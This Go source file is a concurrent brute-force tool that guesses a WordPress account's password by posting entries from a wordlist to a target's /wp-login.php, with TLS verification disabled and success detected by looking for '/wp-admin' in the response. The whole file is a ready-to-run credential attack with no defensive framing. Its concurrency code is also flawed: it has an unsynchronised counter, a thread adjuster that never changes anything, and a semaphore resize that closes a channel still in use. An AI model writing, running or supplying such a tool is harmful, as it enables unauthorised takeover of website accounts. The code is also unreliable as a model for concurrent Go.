package main

import (
    "bufio"
    "context"
    "crypto/tls"
    "flag"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

var clientPool = &sync.Pool{
    New: func() interface{} {
        return &http.Client{
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        }
    },
}

func main() {
    urlPtr := flag.String("url", "", "URL of the target")
    usernamePtr := flag.String("username", "", "Username of the target")
    passwordListPtr := flag.String("password-list", "", "Path to the password list file")
    threadCount := flag.String("threads", "5", "Number of threads or 'auto' for automatic adjustment")
    flag.Parse()

    if *urlPtr == "" || *usernamePtr == "" || *passwordListPtr == "" {
        flag.PrintDefaults()
        os.Exit(1)
    }

    passwords, err := loadPasswords(*passwordListPtr)
    if err != nil {
        log.Fatalf("Failed to load passwords: %v", err)
    }

    numThreads, autoThreads := parseThreadCount(*threadCount)
    semaphore := make(chan struct{}, numThreads)
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    if autoThreads {
        go adjustThreadCount(ctx, &semaphore, numThreads)
    }

    var wg sync.WaitGroup
    startTime := time.Now()
    totalPasswords := len(passwords)
    passwordsTested := 0

    for _, password := range passwords {
        semaphore <- struct{}{}
        wg.Add(1)
        go func(pass string) {
            defer wg.Done()
            defer func() { <-semaphore }()
            if attemptLogin(ctx, *urlPtr, *usernamePtr, pass) {
                fmt.Printf("Success: Password found -> %s\n", pass)
                cancel()
                os.Exit(0)
            }
            if passwordsTested%100 == 0 {
                elapsed := time.Since(startTime)
                fmt.Printf("Tested: %d/%d passwords. Elapsed Time: %s\n", passwordsTested, totalPasswords, elapsed)
            }
            passwordsTested++
        }(password)
    }
    wg.Wait()
    fmt.Println("Completed. No successful login found.")
}

func parseThreadCount(threadCount string) (int, bool) {
    if threadCount == "auto" {
        return 10, true
    }
    n, err := strconv.Atoi(threadCount)
    if err != nil {
        log.Fatalf("Invalid thread count: %v", err)
    }
    return n, false
}

func adjustThreadCount(ctx context.Context, semaphore *chan struct{}, initialThreads int) {
    minThreads := 1
    maxThreads := 100
    adjustInterval := 10 * time.Second
    timer := time.NewTicker(adjustInterval)
    defer timer.Stop()

    for {
        select {
        case <-ctx.Done():
            return
        case <-timer.C:
            currentThreads := len(*semaphore)
            targetSize := currentThreads // Start with current size
            if targetSize < minThreads {
                targetSize = minThreads
            }
            if targetSize > maxThreads {
                targetSize = maxThreads
            }
            if targetSize != currentThreads {
                resizeSemaphore(semaphore, targetSize)
            }
        }
    }
}

func resizeSemaphore(semaphore *chan struct{}, newSize int) {
    newSemaphore := make(chan struct{}, newSize)
    close(*semaphore) // Safely close the old semaphore
    *semaphore = newSemaphore // Replace with the new one
}

func loadPasswords(filePath string) ([]string, error) {
    file, err := os.Open(filePath)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var passwords []string
    scanner := bufio.NewScanner(file)
    scanner.Buffer(make([]byte, 64*1024), bufio.MaxScanTokenSize)
    for scanner.Scan() {
        password := scanner.Text()
        if password != "" {
            passwords = append(passwords, password)
        }
    }
    return passwords, scanner.Err()
}

func attemptLogin(ctx context.Context, urlStr, username, password string) bool {
    client := clientPool.Get().(*http.Client)
    defer clientPool.Put(client)

    data := url.Values{}
    data.Set("log", username)
    data.Set("pwd", password)

    req, err := http.NewRequestWithContext(ctx, "POST", urlStr+"/wp-login.php", strings.NewReader(data.Encode()))
    if err != nil {
        log.Println("Request creation failed:", err)
        return false
    }

    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    resp, err := client.Do(req)
    if err != nil {
        log.Println("Login request failed:", err)
        return false
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Println("Failed to read response body:", err)
        return false
    }

    return isLoginSuccessful(string(body))
}

func isLoginSuccessful(body string) bool {
    return strings.Contains(body, "/wp-admin") && !strings.Contains(body, "error")
}
